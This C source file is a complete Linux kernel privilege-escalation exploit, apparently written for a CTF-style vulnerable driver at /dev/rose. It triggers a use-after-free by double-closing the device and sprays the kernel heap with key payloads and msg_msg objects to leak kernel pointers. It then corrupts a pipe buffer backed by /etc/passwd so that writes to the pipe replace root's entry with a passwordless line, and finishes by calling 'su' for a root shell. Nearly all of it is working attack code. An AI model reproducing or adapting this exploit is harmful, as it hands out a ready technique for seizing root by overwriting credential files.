#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <limits.h>
#include <stdarg.h>
#include <sys/xattr.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sched.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/timerfd.h>

#define DEV_PATH "/dev/rose"   // the path the device is placed

#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }


int pipes[0x1000][0x02];
int qids[0x1000];
int keys[0x1000];
int seq_ops[0x10000];
int ptmx[0x1000];
int n_keys;

typedef struct msg_msg_seg msg_msg_seg_t;
struct msg_msg_seg {
    msg_msg_seg_t* next;
};

struct rcu_head {
    void *next;
    void *func;
};

typedef struct msg_msg {
    struct rcu_head m_list;
    long m_type;
    size_t m_ts;      /* message text size */
    struct msg_msgseg *next;
    void *security;
    /* the actual message follows immediately */
} msg_msg_t;

// size = 40
typedef struct
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
}pipe_buf_t;

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

typedef struct {
    long kaslr_base;
    long physmap_base;
} leak_t;

typedef int32_t key_serial_t;

static void alloc_qid(int i) {
    qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qids[i] < 0) {
        errExit("[X] msgget");
    }
}

static void send_msg(int qid, int c, int size, long type)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size - sizeof(msg_msg_t)];
    } msg;

    if (!type) {
        msg.mtype = 0xffff;
    }
    else {
        msg.mtype = type;
    }

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
    {
        errExit("msgsnd");
    }
}

static void send_msg_payload(int qid, char* buf, int size, long type)
{
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SZ) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf
    {
        long mtype;
        char mtext[size - off];
    } msg;

    memcpy(msg.mtext, buf, sizeof(msg.mtext));

    if (!type) {
        msg.mtype = 0xffff;
    }
    else {
        msg.mtype = type;
    }

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
    {
        errExit("msgsnd");
    }
}

static void recv_msg(int qid, void* data, size_t sz)
{
    int ret;
    struct msg_buf
    {
        long mtype;
        char mtext[sz - 0x30];
    } msg;

    ret = msgrcv(qid, &msg, sz - 0x30, 0xffff, IPC_NOWAIT);

    memmove(data, msg.mtext, sizeof(msg.mtext));

    if (ret < 0) {
        errExit("msgrcv");
    }
}

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void alloc_tty(int i) {
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

static void free_tty(int i) {
    if (close(ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

static bool is_kernel_ptr(uint64_t val)
{
    return (val & KERNEL_MASK) == KERNEL_MASK
        && val != 0xffffffffffffffff;
}

static bool is_heap_ptr(uint64_t val)
{
    return (val & HEAP_MASK) == HEAP_MASK
        && (val & KERNEL_MASK) != KERNEL_MASK
        && val != 0xffffffffffffffff;
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    long ret = syscall(__NR_add_key, type, description, payload, plen, ringid);
    if (ret < 0) {
        errExit("add_key");
    }
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

static long free_key(key_serial_t key) {

    long ret = keyctl(KEYCTL_REVOKE, key, 0, 0, 0);

    if (ret < 0) {
        errExit("keyctl revoke");
    }

    ret = keyctl(KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING, 0, 0);

    if (ret < 0) {
        errExit("keyctl unlink");
    }
}

static int alloc_key(int id, char *buf, size_t size)
{
    char desc[0x400] = { 0 };
    char payload[0x400] = {0};
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    if (!buf) {
        memset(payload, 0x41, size);
    }
    else {
        memcpy(payload, buf, size);
    }

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
        errExit("add_key");
	}

    return key;
}

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void release_pipe_buf(int i)
{
    if (close(pipes[i][0]) < 0) {
        errExit("[X] release_pipe_buf");
    }

    if (close(pipes[i][1]) < 0) {
        errExit("[X] release_pipe_buf");
    }
}

int main(int argc, char** argv)
{
    int fd1;
    int fd2;
    int fd3;
    int fd4;
    int ret;
    uint8_t buf[0x10000];

    for (int i = 0x0; i < 0x10; i++) {
        alloc_pipe_buf(i);
        write(pipes[i][1], "hello", 5);
    }

    fd1 = open(DEV_PATH, O_RDONLY);
    fd2 = open(DEV_PATH, O_RDONLY);

    if (fd1 < 0 || fd2 < 0) {
        errExit("open");
    }

    close(fd1);

    info("spraying userkey structs \n");

    // allocated user_key_payload in place of freed struct
    for (int i = 0; i < 0x10; i++) {
        keys[i] = alloc_key(n_keys++, 0, 800);
    }

    info("closing second fd \n");
    // free user_key_payload
    close(fd2);

    info("Spraying msg ojects \n");
    // spray msg objects, corrupt userkey payload
    for (int i = 0; i < 0x40;i++) {
        alloc_qid(i);
        send_msg(qids[i], 0xff, 0x400, 0);
    }

    memset(buf, 0x0, sizeof(buf));
    uint64_t* p_buf = (uint64_t*)buf;

    int fd_passwd = open("/etc/passwd", O_RDONLY);
    if (fd_passwd < 0) {
        errExit("open /etc/passwd");
    }

    // call splice on the initial sprayed pipes, causing file-backed pipe_buffer to be allocated.
    // we will leak these pointers later
    for (int i = 0; i < 0x10; i++) {
        ret = splice(fd_passwd, NULL, pipes[i][1], NULL, 1 ,0);
        if (ret  < 0) {
            errExit("splice");
        }
    }

    // search corrupted user_key_payload for oor
    int corrupted_userkey = 0x0;
    for (int i = 0; i < 0x10; i++) {
        ret = keyctl(KEYCTL_READ, keys[i], buf, sizeof(buf), 0);
        if (ret == sizeof(buf)-1) {
            corrupted_userkey = i;
            info("Found corrupted userkey payload \n");
            break;
        }
        if (ret < 0) {
            errExit("keyctl read");
        }
    }

    // search file backed pipe_buffer struct
    int pipe_idx = 0x0;
    for (int i = 0; i < sizeof(buf) / sizeof(uint64_t); i++) {
        pipe_buf_t* initial_buf = (pipe_buf_t*)&p_buf[i];
        pipe_buf_t* file_backed_buf = (pipe_buf_t*)&p_buf[i+5];
        if (is_heap_ptr(initial_buf->page) && is_kernel_ptr(initial_buf->ops) &&
            is_heap_ptr(file_backed_buf->page) && is_kernel_ptr(file_backed_buf->ops)) {

            // len == 5 because alloc_pipe_buf writes 5 bytes to pipe
            if (initial_buf->len == 5 && initial_buf->flags == 0x10 && file_backed_buf->flags == 0) {
                pipe_idx = i+5;
                print_hex8(initial_buf, 0x50);
                break;
            }
        }
    }

    if (pipe_idx == 0x0) {
        printf("Unable to find pipe \n");
        return 0;
    }

    for (int i = 0; i < 0x10; i++) {
        if (i != corrupted_userkey) {
            free_key(keys[i]);
        }
    }

    fd3 = open(DEV_PATH, O_RDONLY);
    fd4 = open(DEV_PATH, O_RDONLY);

    if (fd3 < 0  || fd4 < 0) {
        errExit("fd3 / fd4");
    }

    close(fd3);

    for (int i = 0x10; i < 0x20; i++) {
        alloc_pipe_buf(i);
        write(pipes[i][1], "hello", 5);
    }

    // create more file backed pipe_bufs, one of them we will corrupt
    for (int i = 0x10; i < 0x20; i++) {
        ret = splice(fd_passwd, NULL, pipes[i][1], NULL, 1 ,0);
        if (ret  < 0 || ret == 0) {
            errExit("splice");
        }
    }

    pipe_buf_t *pipe = (pipe_buf_t*)&p_buf[pipe_idx];
    info("Pipe data: %p %p %lx \n", pipe->page, pipe->ops, pipe->flags);

    // set PIPE_BUF_FLAG_CAN_MERGE flag on file backed pipe_buf
    pipe->flags = 0x10;
    pipe->len = 0x0;
    pipe->offset = 0x0;

    // UAF pipe buf
    close(fd4);

    char msg_msg_buf[0x2000] = {0};

    /*** Method 1: corrupt using msg_msg struct ***/
    // -4 since the first 8 byte will be written by msg_msg_seg->next
    memcpy(&msg_msg_buf[PAGE_SZ - sizeof(msg_msg_t)], &p_buf[pipe_idx-4], 0x100);
    for (int i = 0x40; i < 0x50; i++) {
        alloc_qid(i);
        //send_msg(qids[i], 0x41, 0x400, 0);
        send_msg_payload(qids[i], msg_msg_buf, PAGE_SZ + 0x400, 0x0);
    }

    /*** Method 2: corrupt using user_key_payload struct ***/
    /*
    for (int i = 0x0; i < 0x10; i++) {
        if (i == corrupted_userkey) {
            continue;
        }
        // pipe_idx-2 since user_key_payload takes up 24 bytes so we corrupt starting
        // from pipe->flags member of the initial pipe_buf in the ringbuffer
        // (so 16 byte left of that struct before we can corrupt file backed)
        keys[i] = alloc_key(n_keys++, &p_buf[pipe_idx-2], 800);
    }
    */

    const char *const data = "root::0:0:root:/root:/bin/sh\n";
    for (int i = 0x10; i < 0x20; i++) {
        ret = write(pipes[i][1], data, strlen(data));
        //read(pipes[i][0], buf, 0x400);
    }

    info("Calling system \n");
    system("cat /etc/passwd");
    system("su");

    WAIT();
}
